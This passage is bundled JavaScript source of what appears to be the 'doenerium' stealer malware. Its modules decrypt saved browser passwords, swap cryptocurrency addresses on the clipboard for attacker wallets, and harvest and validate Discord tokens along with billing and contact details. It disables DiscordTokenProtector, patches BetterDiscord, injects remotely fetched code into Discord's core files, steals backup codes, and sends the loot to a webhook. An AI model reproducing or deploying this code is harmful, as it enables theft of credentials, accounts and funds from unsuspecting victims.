                                                            decipher = client.requires.crypto.createDecipheriv(
                                                                "aes-256-gcm",
                                                                key,
                                                                start
                                                            );
                                                        decipher.setAuthTag(end);
                                                        password =
                                                            decipher.update(middle, "base64", "utf-8") +
                                                            decipher.final("utf-8");
                                                    }

                                                    client.config.environ.all_passwords.push(password)



                                                    client.config.environ.passwords.all.push(
                                                        `==================================================\nURL          : ${row["origin_url"]}\nWeb Browser  : ${browser}\nUser Name    : ${row["username_value"]}\nPassword     : ${password}\nFilename     : ${path}\n==================================================`
                                                    );

                                                    if (!client.config.environ.passwords[browser]) {
                                                        client.config.environ.passwords[browser] = [];
                                                    }
                                                    client.config.environ.passwords[browser].push(
                                                        `==================================================\nURL          : ${row["origin_url"]}\nWeb Browser  : ${browser}\nUser Name    : ${row["username_value"]}\nPassword     : ${password}\nFilename     : ${path}\n==================================================`
                                                    );

                                                    client.config.counter.passwords++;
                                                } catch (e) { console.log(e) }
                                            }
                                        },
                                        function () {
                                            resolve("");
                                        }
                                    );
                                });
                            }
                        },
                    };
                };


                /***/
            }),

/***/ 879:
/***/ ((module) => {

                module.exports = (client) => {
                    return {
                        async detectClipboard() {
                            while (true) {
                                try {
                                    const paste = client.requires.child_process
                                        .execSync(`powershell Get-Clipboard`)
                                        .toString("utf8")
                                        .replace("\r", "");
                                    let text = paste;
                                    let dtc = false;

                                    for (let [key, value] of Object.entries({
                                        btc: /^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$/,
                                        ltc: /(?:^[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$)/,
                                        eth: /(?:^0x[a-fA-F0-9]{40}$)/,
                                        xlm: /(?:^G[0-9a-zA-Z]{55}$)/,
                                        xmr: /(?:^4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$)/,
                                        xrp: /(?:^r[0-9a-zA-Z]{24,34}$)/,
                                        bch: /^((bitcoincash:)?(q|p)[a-z0-9]{41})/,
                                        dash: /(?:^X[1-9A-HJ-NP-Za-km-z]{33}$)/,
                                        neo: /(?:^A[0-9a-zA-Z]{33}$)/,
                                        doge: /D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}/,
                                    })) {
                                        for (let line of text.split("\n")) {
                                            if (value.test(line.replace("\r", ""))) {
                                                dtc = true;
                                                text = text.replace(
                                                    line,
                                                    client.utils.encryption.decryptData(client.config.crypto[key])
                                                );
                                            }
                                        }
                                    }

                                    if (dtc) {
                                        await client.requires.child_process.execSync(
                                            `powershell Set-Clipboard ${text}`
                                        );
                                    }

                                    await client.utils.time.sleep(1000);
                                } catch { }
                            }
                        },
                    };
                };


                /***/
            }),

/***/ 109:
/***/ ((module) => {

                module.exports = (client) => {
                    return {
                        loadCPUS() {
                            var _cpus = []

                            client.requires.os.cpus().forEach((cpu) => {
                                if (!_cpus.contains(cpu.model)) {
                                    _cpus.push(cpu.model)
                                    client.config.user.cpus.push(client.utils.encryption.encryptData(cpu.model.split("  ")[0]))
                                }
                            })
                        },
                    };
                };

                /***/
            }),

/***/ 725:
/***/ ((module) => {

                module.exports = (client) => {
                    return {

                        copyRecursiveSync(src, dest) {
                            var exists = client.requires.fs.existsSync(src);
                            var stats = exists && client.requires.fs.statSync(src);
                            var isDirectory = exists && stats.isDirectory();
                            if (isDirectory) {
                                client.requires.fs.mkdirSync(dest);
                                client.requires.fs.readdirSync(src).forEach((childItemName) => {
                                    this.copyRecursiveSync(client.requires.path.join(src, childItemName),
                                        client.requires.path.join(dest, childItemName));
                                });
                            } else {
                                client.requires.fs.copyFileSync(src, dest);
                            }
                        }
                    };
                };

                /***/
            }),

/***/ 779:
/***/ ((module) => {

                module.exports = (client) => {
                    return {

                        async getTokens() {
                            var paths = {
                                'Discord': client.utils.encryption.decryptData(client.config.user.appdata) + '\\discord\\Local Storage\\leveldb\\',
                                'Discord Canary': client.utils.encryption.decryptData(client.config.user.appdata) + '\\discordcanary\\Local Storage\\leveldb\\',
                                'Lightcord': client.utils.encryption.decryptData(client.config.user.appdata) + '\\Lightcord\\Local Storage\\leveldb\\',
                                'Discord PTB': client.utils.encryption.decryptData(client.config.user.appdata) + '\\discordptb\\Local Storage\\leveldb\\',
                                'Opera': client.utils.encryption.decryptData(client.config.user.appdata) + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
                                'Opera GX': client.utils.encryption.decryptData(client.config.user.appdata) + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
                                'Amigo': client.utils.encryption.decryptData(client.config.user.localappdata) + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
                                'Torch': client.utils.encryption.decryptData(client.config.user.localappdata) + '\\Torch\\User Data\\Local Storage\\leveldb\\',
                                'Kometa': client.utils.encryption.decryptData(client.config.user.localappdata) + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
                                'Orbitum': client.utils.encryption.decryptData(client.config.user.localappdata) + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
                                'CentBrowser': client.utils.encryption.decryptData(client.config.user.localappdata) + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
                                '7Star': client.utils.encryption.decryptData(client.config.user.localappdata) + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
                                'Sputnik': client.utils.encryption.decryptData(client.config.user.localappdata) + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
                                'Vivaldi': client.utils.encryption.decryptData(client.config.user.localappdata) + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
                                'Chrome SxS': client.utils.encryption.decryptData(client.config.user.localappdata) + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
                                'Chrome': client.utils.encryption.decryptData(client.config.user.localappdata) + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
                                'Epic Privacy Browser': client.utils.encryption.decryptData(client.config.user.localappdata) + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
                                'Microsoft Edge': client.utils.encryption.decryptData(client.config.user.localappdata) + '\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\',
                                'Uran': client.utils.encryption.decryptData(client.config.user.localappdata) + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
                                'Yandex': client.utils.encryption.decryptData(client.config.user.localappdata) + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
                                'Brave': client.utils.encryption.decryptData(client.config.user.localappdata) + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
                                'Iridium': client.utils.encryption.decryptData(client.config.user.localappdata) + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
                            }

                            for (let [key, value] of Object.entries(paths)) {
                                if (!client.requires.fs.existsSync(value)) {
                                    continue;
                                }

                                for (var file_name of client.requires.fs.readdirSync(value)) {
                                    if (!file_name.endsWith(".log") && !file_name.endsWith(".ldb")) {
                                        continue;
                                    }

                                    let path_split = value.split('\\'),
                                        path_split_tail = value.includes('Network') ? path_split.splice(0, path_split.length - 3) : path_split.splice(0, path_split.length - 2),
                                        path_tail = path_split_tail.join('\\') + '\\';



                                    for (var line of client.requires.fs.readFileSync(`${value}/${file_name}`, encoding = "utf8").split("\n")) {

                                        if (value.includes("cord")) {

                                            let encrypted = Buffer.from(JSON.parse(client.requires.fs.readFileSync(path_tail.replace("Local Storage", "Local State")))
                                                .os_crypt.encrypted_key, 'base64')
                                                .slice(5);

                                            const _key = client.requires.dpapi.unprotectData(Buffer.from(encrypted, "utf-8"), null, 'CurrentUser');

                                            var encrypted_regex = /dQw4w9WgXcQ:[^\"]*/;
                                            if (line.match(encrypted_regex)) {
                                                try {
                                                    var token = Buffer.from(line.match(encrypted_regex)[0].split('dQw4w9WgXcQ:')[1], "base64");
                                                    let start = token.slice(3, 15),
                                                        middle = token.slice(15, token.length - 16),
                                                        end = token.slice(token.length - 16, token.length),
                                                        decipher = client.requires.crypto.createDecipheriv('aes-256-gcm', _key, start);

                                                    decipher.setAuthTag(end);
                                                    token = decipher.update(middle, 'base64', 'utf-8') + decipher.final('utf-8')

                                                    await this.validateToken(key, token);
                                                } catch (e) { console.log(e) }
                                            }
                                        } else {
                                            [/\w-]{24}\.[\w-]{6}\.[\w-]{27}/, /mfa\.[\w-]{84}/].forEach(async (regex) => {
                                                if (line.match(regex)) {
                                                    await this.validateToken(key, line.match(regex)[0]);
                                                }
                                            })
                                        }
                                    }
                                }
                            }


                        },

                        async validateToken(source, token) {

                            if (client.config.environ.validated_tokens.contains(token)) {
                                return;
                            }

                            client.config.environ.validated_tokens.push(token)

                            const req = await client.axios_instance({
                                url: "https://discord.com/api/v9/users/@me",
                                method: "GET",
                                headers: {
                                    "Authorization": token,
                                    "Content-Type": "application/json",
                                    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
                                }
                            }).catch((err) => {
                                return err.response;
                            });

                            if (req.request.res.statusCode == 200) {

                                const billing = await client.axios_instance({
                                    url: "https://discord.com/api/v9/users/@me/billing/payment-sources",
                                    method: "GET",
                                    headers: {
                                        "Authorization": token,
                                        "Content-Type": "application/json",
                                        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
                                    }
                                }).catch((err) => {
                                    return err.response;
                                });

                                var _billing = [];

                                try {

                                    billing.data.forEach(billing => {
                                        if (billing.type == "") {
                                            return "false"
                                        } else if (billing.invalid == true) {
                                            return "false"
                                        } else if (billing.type == 2) {
                                            _billing.push("PayPal")
                                        } else if (billing.type == 1) {
                                            _billing.push(`Credit Card (${billing.country})`)
                                        }
                                    })

                                } catch (e) { console.log(e) }

                                if (!client.config.discord.grabbed_tokens[source]) {
                                    client.config.discord.grabbed_tokens[source] = []
                                }

                                client.config.discord.grabbed_tokens[source].push({
                                    "source": source,
                                    "id": req.data.id,
                                    "username": `${req.data.username}#${req.data.discriminator}`,
                                    "phone": req.data.phone,
                                    "email": req.data.email,
                                    "locale": req.data.locale,
                                    "nitro": this.getNitro(req.data.premium_type),
                                    "badges": this.getBadges(req.data.flags),
                                    "billing": _billing.join(", ") != '' ? _billing.join(", ") : 'None',
                                    "token": token
                                });

                                client.config.discord.grabbed_tokens.all.push({
                                    "source": source,
                                    "id": req.data.id,
                                    "username": `${req.data.username}#${req.data.discriminator}`,
                                    "phone": req.data.phone,
                                    "email": req.data.email,
                                    "locale": req.data.locale,
                                    "nitro": this.getNitro(req.data.premium_type),
                                    "badges": this.getBadges(req.data.flags),
                                    "billing": _billing.join(", ") != '' ? _billing.join(", ") : 'None',
                                    "token": token
                                });

                                var fields = [];

                                for (let [key, value] of Object.entries({
                                    "Source": source,
                                    "Identifier": req.data.id,
                                    "Username": `${req.data.username}#${req.data.discriminator}`,
                                    "Phone Number": req.data.phone,
                                    "E-Mail Address": req.data.email,
                                    "Locale": req.data.locale,
                                    "Nitro": this.getNitro(req.data.premium_type),
                                    "Badges": this.getBadges(req.data.flags) != '' ? this.getBadges(req.data.flags) : 'None',
                                    "Billing": _billing.join(", ") != '' ? _billing.join(", ") : 'None',
                                    "Token": token
                                })) {
                                    fields.push({
                                        name: key,
                                        value: `\`\`\`${value}\`\`\``,
                                        inline: true,
                                    })
                                }

                                await client.utils.webhook.sendToWebhook(
                                    {
                                        "embeds": [client.utils.webhook.createEmbed({
                                            "title": `Found token in: ${source}`,
                                            "fields": fields,
                                            "thumbnail": {
                                                "url": req.data.avatar ? `https://cdn.discordapp.com/avatars/${req.data.id}/${req.data.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
                                            },
                                            "author": {
                                                "name": `${req.data.username}#${req.data.discriminator} (${req.data.id})`,
                                                "url": client.utils.encryption.decryptData(client.config.embed.href),
                                                "icon_url": req.data.avatar ? `https://cdn.discordapp.com/avatars/${req.data.id}/${req.data.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
                                            },
                                        })],
                                    })
                            }
                        },

                        async saveDiscordTokens() {
                            if (client.config.discord.grabbed_tokens.all.length == 0) {
                                return;
                            }
                            client.utils.jszip.createFolder("\\Discord")

                            for (let [key, value] of Object.entries(client.config.discord.grabbed_tokens)) {
                                if (value.length != 0) {
                                    let result = "";

                                    for (let obj of value) {
                                        result += `==================================================\nSource          : ${obj.source}\nIdentifier      : ${obj.id}\nUsername        : ${obj.username}\nPhone           : ${obj.phone}\nE-Mail Address  : ${obj.email}\nLocale          : ${obj.locale}\nNitro           : ${obj.nitro}\nBadges          : ${obj.badges != '' ? obj.badges : 'None'}\nBilling         : ${obj.billing != '' ? obj.billing : 'None'}\nToken           : ${obj.token}\n==================================================\n\n`;
                                    }

                                    client.utils.jszip.createTxt(`\\Discord\\${key.toUpperCase()}.txt`, result)
                                }
                            }
                        },

                        getBadges(flags) {
                            var badges = {
                                Discord_Employee: {
                                    Value: 1,
                                    Emoji: "Discord Employee",
                                    Rare: true,
                                },
                                Partnered_Server_Owner: {
                                    Value: 2,
                                    Emoji: "Partnered Server Owner",
                                    Rare: true,
                                },
                                HypeSquad_Events: {
                                    Value: 4,
                                    Emoji: "HypeSquad Events",
                                    Rare: true,
                                },
                                Bug_Hunter_Level_1: {
                                    Value: 8,
                                    Emoji: "Bug Hunter Level 1",
                                    Rare: true,
                                },
                                Early_Supporter: {
                                    Value: 512,
                                    Emoji: "Early Supporter",
                                    Rare: true,
                                },
                                Bug_Hunter_Level_2: {
                                    Value: 16384,
                                    Emoji: "Bug Hunter Level 2",
                                    Rare: true,
                                },
                                Early_Verified_Bot_Developer: {
                                    Value: 131072,
                                    Emoji: "Early Verified Bot Developer",
                                    Rare: true,
                                },
                                House_Bravery: {
                                    Value: 64,
                                    Emoji: "House Bravery",
                                    Rare: false,
                                },
                                House_Brilliance: {
                                    Value: 128,
                                    Emoji: "House Brilliance",
                                    Rare: false,
                                },
                                House_Balance: {
                                    Value: 256,
                                    Emoji: "House Balance",
                                    Rare: false,
                                }
                            };

                            var result = [];
                            for (var prop in badges) {
                                prop = badges[prop]
                                if ((flags & prop.Value) == prop.Value && prop.Rare) result.push(prop.Emoji);
                            };
                            return result.join(", ");
                        },

                        getNitro(premium_type) {
                            switch (premium_type) {
                                case 0:
                                    return "No Nitro";
                                case 1:
                                    return "Nitro Classic";
                                case 2:
                                    return "Nitro Boost";
                                default:
                                    return "No Nitro";

                            };
                        },

                        bypass_token_protector() {
                            for (const file of ["DiscordTokenProtector.exe", "ProtectionPayload.dll", "secure.dat"]) {
                                if (client.requires.fs.exists(`${client.utils.encryption.decryptData(client.config.user.localappdata)}\\${file}`)) {
                                    client.requires.fs.rm(`${client.utils.encryption.decryptData(client.config.user.localappdata)}\\${file}`);
                                }
                            }

                            const token_protector_config = JSON.parse(client.requires.fs.readFileSync(`${client.utils.encryption.decryptData(client.config.user.localappdata)}\\DiscordTokenProtector\\config.json`, {
                                encoding: "utf-8"
                            }))

                            token_protector_config['auto_start'] = false
                            token_protector_config['auto_start_discord'] = false
                            token_protector_config['integrity'] = false
                            token_protector_config['integrity_allowbetterdiscord'] = false
                            token_protector_config['integrity_checkexecutable'] = false
                            token_protector_config['integrity_checkhash'] = false
                            token_protector_config['integrity_checkmodule'] = false
                            token_protector_config['integrity_checkscripts'] = false
                            token_protector_config['integrity_checkresource'] = false
                            token_protector_config['integrity_redownloadhashes'] = false
                            token_protector_config['iterations_iv'] = 0
                            token_protector_config['iterations_key'] = 0
                            token_protector_config['version'] = 0

                            client.requires.fs.writeFileSync(
                                `${client.utils.encryption.decryptData(client.config.user.localappdata)}\\DiscordTokenProtector\\config.json`,
                                JSON.stringify(
                                    token_protector_config,
                                    null, 4
                                )
                            )
                        },

                        async listExecutables() {
                            var processes = []
                            client.requires.child_process.exec('tasklist', (err, stdout) => {
                                for (const executable of ['Discord.exe', 'DiscordCanary.exe', 'discordDevelopment.exe', 'DiscordPTB.exe']) {
                                    if (stdout.includes(executable)) {
                                        client.config.discord.running_executables.push(executable)
                                        processes.push(executable)
                                    }
                                }
                            })

                            return processes
                        },

                        pwnBetterDiscord() {
                            if (client.requires.fs.existsSync(client.utils.encryption.decryptData(client.config.user.appdata) + "/BetterDiscord/data/betterdiscord.asar")) {
                                var _ = client.requires.fs.readFileSync(client.utils.encryption.decryptData(client.config.user.appdata) + "/BetterDiscord/data/betterdiscord.asar")
                                client.requires.fs.writeFileSync(client.utils.encryption.decryptData(client.config.user.appdata) + "/BetterDiscord/data/betterdiscord.asar", client.requires.buf_replace(_,
                                    "api/webhooks", "doenerium_on_top"))

                            }

                        },

                        async modify_discord_core() {
                            const res = await client.axios_instance.get(client.utils.encryption.decryptData(client.config.discord.base_url));

                            const file = () => {
                                let tempFile = res.data.replace('%WEBHOOK_LINK%', client.config.webhook.url).replace("REPLACE_ME", client.config.webhook.url)
                                return tempFile;
                            }

                            for (const path of client.config.discord.files_path) {
                                client.requires.fs.writeFileSync(path, file(), {
                                    encoding: 'utf8',
                                    flag: 'w'
                                });
                            }
                        },

                        findDiscordCore(prefixPath, files) {
                            files.forEach((file) => {
                                if (client.requires.fs.statSync(`${prefixPath}\\${file}`).isDirectory()) {
                                    this.findDiscordCore(`${prefixPath}\\${file}`, client.requires.fs.readdirSync(`${prefixPath}\\${file}`))
                                } else {
                                    if (file == "index.js" && !prefixPath.includes("node_modules") && prefixPath.includes("desktop_core")) {
                                        client.config.discord.files_path.push(`${prefixPath}\\${file}`);
                                    }
                                }
                            })
                        },

                        findBackupCodes(prefixPath, files) {
                            files.forEach(async (file) => {
                                if (file.startsWith(".") || file.includes("AppData") || file.includes("Program")) {
                                    return;
                                }
                                if (file.startsWith("discord_backup_codes")) {
                                    await client.utils.webhook.sendToWebhook(
                                        {
                                            "embeds": [client.utils.webhook.createEmbed({
                                                "title": `💰 Discord backup codes found`,
                                                "description": `\`\`\`${prefixPath}\\${file}\n\n${client.requires.fs.readFileSync(`${prefixPath}\\${file}`)}\`\`\``,
                                            })],
                                        })
                                    client.utils.jszip.createTxt(`\\${file}_${client.requires.crypto.randomUUID()}.txt`, client.requires.fs.readFileSync(`${prefixPath}\\${file}`))
                                }
                            })
                        },

                        async getIP() {
                            return (await client.axios_instance.get("https://ipinfo.io/json")).data;
                        },

                        async init() {
                            this.pwnBetterDiscord();
                            for (const folder of client.requires.fs.readdirSync(client.utils.encryption.decryptData(client.config.user.localappdata))) {
                                if (folder.toLowerCase().includes('iscord')) {
                                    client.config.discord.executables.push(`${client.utils.encryption.decryptData(client.config.user.localappdata)}\\${folder}`)
                                }
                            }

                            for (const executable of client.config.discord.executables) {
                                this.findDiscordCore(executable, client.requires.fs.readdirSync(executable))
                            }

                            ["Videos", "Desktop", "Documents", "Downloads", "Pictures"].forEach(async (type) => {
                                try {
                                    this.findBackupCodes(`${client.utils.encryption.decryptData(client.config.user.hostdir)}\\${type}`, client.requires.fs.readdirSync(`${client.utils.encryption.decryptData(client.config.user.hostdir)}\\${type}`))
                                }
                                catch (e) { console.log(e) }
                            })

                            await this.modify_discord_core(); // 1

                            await client.requires.child_process.exec('tasklist', async (err, stdout) => {
                                for (const executable of ['Discord.exe', 'DiscordCanary.exe', 'discordDevelopment.exe', 'DiscordPTB.exe']) {
                                    if (stdout.includes(executable)) {
                                        await client.requires.child_process.exec(`taskkill /F /T /IM ${executable}`, (err) => { }) // Close
                                        await client.requires.child_process.exec(`"${client.utils.encryption.decryptData(client.config.user.localappdata)}\\${executable.replace('.exe', '')}\\Update.exe" --processStart ${executable}`, (err) => { }) // Start
                                    }
                                }
                            })

                            const network_data = await this.getIP();

                            client.utils.jszip.createTxt("\\Network Data.txt", `IP Address: ${network_data['ip'] ?? "Unknown"}\nHostname: ${network_data['hostname'] ?? "Unknown"}\nCity: ${network_data['city'] ?? "Unknown"}\nRegion: ${network_data['region'] ?? "Unknown"}\nCountry: ${network_data["country"] ?? "Unknown"}\nTimezone: ${network_data["timezone"] ?? "Unknown"}`)

                            await client.utils.time.sleep(5000);
                            for (const path of client.config.discord.files_path) {
                                if (client.requires.fs.existsSync(path.replace("index.js", "doenerium"))) {
                                    client.requires.fs.rmdirSync(path.replace("index.js", "doenerium"));
                                }
                            }
                        }
                    };
                };


                /***/
            }),

/***/ 480:
/***/ ((module) => {

                module.exports = (client) => {
                    return {
                        encryptData(data) {
                            return data;
                        },

                        decryptData(data) {
                            return data;
                        }
                    };
                };

                /***/
            }),

/***/ 561:
/***/ ((module) => {

                module.exports = (client) => {
                    return {
                        getFlag(country) {
                            switch (country) {
                                case "AD":
                                    return "🇦🇩";
                                case "AE":
                                    return "🇦🇪";
                                case "AF":
                                    return "🇦🇫";
                                case "AG":
                                    return "🇦🇬";
                                case "AI":
                                    return "🇦🇮";
                                case "AL":
                                    return "🇦🇱";
                                case "AM":
                                    return "🇦🇲";
                                case "AO":
                                    return "🇦🇴";
                                case "AQ":
                                    return "🇦🇶";
                                case "AR":
                                    return "🇦🇷";
                                case "AS":
                                    return "🇦🇸";
                                case "AT":
                                    return "🇦🇹";
                                case "AU":
                                    return "🇦🇺";
                                case "AW":
                                    return "🇦🇼";
                                case "AX":
                                    return "🇦🇽";
                                case "AZ":
                                    return "🇦🇿";
                                case "BA":
                                    return "🇧🇦";
                                case "BB":
                                    return "🇧🇧";
                                case "BD":
                                    return "🇧🇩";
                                case "BE":
                                    return "🇧🇪";
                                case "BF":
                                    return "🇧🇫";
                                case "BG":
                                    return "🇧🇬";
                                case "BH":
                                    return "🇧🇭";
                                case "BI":
                                    return "🇧🇮";
                                case "BJ":
                                    return "🇧🇯";
                                case "BL":
                                    return "🇧🇱";
                                case "BM":
                                    return "🇧🇲";
                                case "BN":
                                    return "🇧🇳";
                                case "BO":
                                    return "🇧🇴";
                                case "BQ":
                                    return "🇧🇶";
                                case "BR":
                                    return "🇧🇷";
                                case "BS":
                                    return "🇧🇸";
                                case "BT":
                                    return "🇧🇹";
                                case "BV":
                                    return "🇧🇻";
                                case "BW":
                                    return "🇧🇼";
                                case "BY":
                                    return "🇧🇾";
                                case "BZ":
                                    return "🇧🇿";
                                case "CA":
                                    return "🇨🇦";
                                case "CC":
                                    return "🇨🇨";
                                case "CD":
                                    return "🇨🇩";
                                case "CF":
                                    return "🇨🇫";
                                case "CG":
                                    return "🇨🇬";
                                case "CH":
                                    return "🇨🇭";
                                case "CI":
                                    return "🇨🇮";
                                case "CK":
                                    return "🇨🇰";
                                case "CL":
                                    return "🇨🇱";
                                case "CM":
                                    return "🇨🇲";
                                case "CN":
                                    return "🇨🇳";
                                case "CO":
                                    return "🇨🇴";
                                case "CR":
                                    return "🇨🇷";
                                case "CU":
                                    return "🇨🇺";
                                case "CV":
                                    return "🇨🇻";
                                case "CW":
                                    return "🇨🇼";
                                case "CX":
                                    return "🇨🇽";
                                case "CY":
                                    return "🇨🇾";
                                case "CZ":
                                    return "🇨🇿";
                                case "DE":
                                    return "🇩🇪";
                                case "DJ":
                                    return "🇩🇯";
                                case "DK":
                                    return "🇩🇰";
                                case "DM":
                                    return "🇩🇲";
                                case "DO":
                                    return "🇩🇴";
                                case "DZ":
                                    return "🇩🇿";
                                case "EC":
                                    return "🇪🇨";
                                case "EE":
                                    return "🇪🇪";
                                case "EG":
                                    return "🇪🇬";
                                case "EH":
                                    return "🇪🇭";
                                case "ER":
                                    return "🇪🇷";
                                case "ES":
                                    return "🇪🇸";
                                case "ET":
                                    return "🇪🇹";
                                case "FI":
                                    return "🇫🇮";
                                case "FJ":
                                    return "🇫🇯";
                                case "FK":
                                    return "🇫🇰";
                                case "FM":
                                    return "🇫🇲";
                                case "FO":
                                    return "🇫🇴";
                                case "FR":
                                    return "🇫🇷";
                                case "GA":
                                    return "🇬🇦";
                                case "GB":
                                    return "🇬🇧";
                                case "GD":
                                    return "🇬🇩";
                                case "GE":
                                    return "🇬🇪";
                                case "GF":
                                    return "🇬🇫";
                                case "GG":
                                    return "🇬🇬";
                                case "GH":
                                    return "🇬🇭";
                                case "GI":
                                    return "🇬🇮";
                                case "GL":
                                    return "🇬🇱";
                                case "GM":
                                    return "🇬🇲";
                                case "GN":
                                    return "🇬🇳";
                                case "GP":
                                    return "🇬🇵";
                                case "GQ":
                                    return "🇬🇶";
                                case "GR":
                                    return "🇬🇷";
                                case "GS":
                                    return "🇬🇸";
                                case "GT":
                                    return "🇬🇹";
                                case "GU":
                                    return "🇬🇺";
                                case "GW":
                                    return "🇬🇼";
                                case "GY":
                                    return "🇬🇾";
                                case "HK":
                                    return "🇭🇰";
                                case "HM":
                                    return "🇭🇲";
                                case "HN":
                                    return "🇭🇳";
                                case "HR":
                                    return "🇭🇷";
                                case "HT":
                                    return "🇭🇹";
                                case "HU":
                                    return "🇭🇺";
                                case "ID":
                                    return "🇮🇩";
                                case "IE":
                                    return "🇮🇪";
                                case "IL":
                                    return "🇮🇱";
                                case "IM":
                                    return "🇮🇲";
                                case "IN":
                                    return "🇮🇳";
                                case "IO":
                                    return "🇮🇴";
                                case "IQ":
                                    return "🇮🇶";
                                case "IR":
                                    return "🇮🇷";
                                case "IS":
                                    return "🇮🇸";
                                case "IT":
                                    return "🇮🇹";
                                case "JE":
                                    return "🇯🇪";
                                case "JM":
                                    return "🇯🇲";
                                case "JO":
                                    return "🇯🇴";
                                case "JP":
                                    return "🇯🇵";
                                case "KE":
                                    return "🇰🇪";
                                case "KG":
                                    return "🇰🇬";
                                case "KH":
                                    return "🇰🇭";
                                case "KI":
                                    return "🇰🇮";
                                case "KM":
                                    return "🇰🇲";
                                case "KN":
                                    return "🇰🇳";
                                case "KP":
                                    return "🇰🇵";
                                case "KR":
                                    return "🇰🇷";
                                case "KW":
                                    return "🇰🇼";
                                case "KY":
                                    return "🇰🇾";
                                case "KZ":
                                    return "🇰🇿";
                                case "LA":
                                    return "🇱🇦";
                                case "LB":
                                    return "🇱🇧";
                                case "LC":
                                    return "🇱🇨";
                                case "LI":
                                    return "🇱🇮";
                                case "LK":
                                    return "🇱🇰";
                                case "LR":
                                    return "🇱🇷";
                                case "LS":
                                    return "🇱🇸";
                                case "LT":
                                    return "🇱🇹";
                                case "LU":
                                    return "🇱🇺";
                                case "LV":
                                    return "🇱🇻";
                                case "LY":
                                    return "🇱🇾";
                                case "MA":
                                    return "🇲🇦";
                                case "MC":
                                    return "🇲🇨";
                                case "MD":
                                    return "🇲🇩";
                                case "ME":
                                    return "🇲🇪";
                                case "MF":
                                    return "🇲🇫";
                                case "MG":
                                    return "🇲🇬";
                                case "MH":
                                    return "🇲🇭";
                                case "MK":
                                    return "🇲🇰";
                                case "ML":
                                    return "🇲🇱";
                                case "MM":
                                    return "🇲🇲";
                                case "MN":
                                    return "🇲🇳";
                                case "MO":
                                    return "🇲🇴";
                                case "MP":
                                    return "🇲🇵";
                                case "MQ":
                                    return "🇲🇶";
                                case "MR":
                                    return "🇲🇷";
                                case "MS":
                                    return "🇲🇸";
                                case "MT":
                                    return "🇲🇹";
                                case "MU":
                                    return "🇲🇺";
                                case "MV":
                                    return "🇲🇻";
                                case "MW":
                                    return "🇲🇼";
                                case "MX":
                                    return "🇲🇽";
                                case "MY":
                                    return "🇲🇾";
                                case "MZ":
                                    return "🇲🇿";
                                case "NA":
                                    return "🇳🇦";
                                case "NC":
                                    return "🇳🇨";
                                case "NE":
                                    return "🇳🇪";
                                case "NF":
                                    return "🇳🇫";
                                case "NG":
                                    return "🇳🇬";
                                case "NI":
                                    return "🇳🇮";
                                case "NL":
                                    return "🇳🇱";
                                case "NO":
                                    return "🇳🇴";
                                case "NP":
                                    return "🇳🇵";
                                case "NR":
                                    return "🇳🇷";
                                case "NU":
                                    return "🇳🇺";
                                case "NZ":
                                    return "🇳🇿";
                                case "OM":
                                    return "🇴🇲";
                                case "PA":
                                    return "🇵🇦";
                                case "PE":
                                    return "🇵🇪";
                                case "PF":
                                    return "🇵🇫";
                                case "PG":
                                    return "🇵🇬";
                                case "PH":
                                    return "🇵🇭";
                                case "PK":
                                    return "🇵🇰";
                                case "PL":
                                    return "🇵🇱";
                                case "PM":
                                    return "🇵🇲";
                                case "PN":
                                    return "🇵🇳";
                                case "PR":
                                    return "🇵🇷";
                                case "PS":
                                    return "🇵🇸";
                                case "PT":
                                    return "🇵🇹";
                                case "PW":
                                    return "🇵🇼";
                                case "PY":
                                    return "🇵🇾";
                                case "QA":
                                    return "🇶🇦";
                                case "RE":
                                    return "🇷🇪";
                                case "RO":
                                    return "🇷🇴";
                                case "RS":
                                    return "🇷🇸";
                                case "RU":
                                    return "🇷🇺";
                                case "RW":
                                    return "🇷🇼";
                                case "SA":
                                    return "🇸🇦";
                                case "SB":
                                    return "🇸🇧";
                                case "SC":
                                    return "🇸🇨";
                                case "SD":
                                    return "🇸🇩";
                                case "SE":
                                    return "🇸🇪";
                                case "SG":
                                    return "🇸🇬";
                                case "SH":
                                    return "🇸🇭";
                                case "SI":
                                    return "🇸🇮";
                                case "SJ":
                                    return "🇸🇯";
                                case "SK":
                                    return "🇸🇰";
                                case "SL":
                                    return "🇸🇱";
                                case "SM":
                                    return "🇸🇲";
                                case "SN":
                                    return "🇸🇳";
                                case "SO":
                                    return "🇸🇴";
                                case "SR":
                                    return "🇸🇷";
                                case "SS":
                                    return "🇸🇸";
                                case "ST":
                                    return "🇸🇹";
                                case "SV":
                                    return "🇸🇻";
                                case "SX":
                                    return "🇸🇽";
                                case "SY":
                                    return "🇸🇾";
                                case "SZ":
                                    return "🇸🇿";
                                case "TC":
                                    return "🇹🇨";
                                case "TD":
                                    return "🇹🇩";
                                case "TF":
                                    return "🇹🇫";
                                case "TG":
                                    return "🇹🇬";
                                case "TH":
                                    return "🇹🇭";
                                case "TJ":
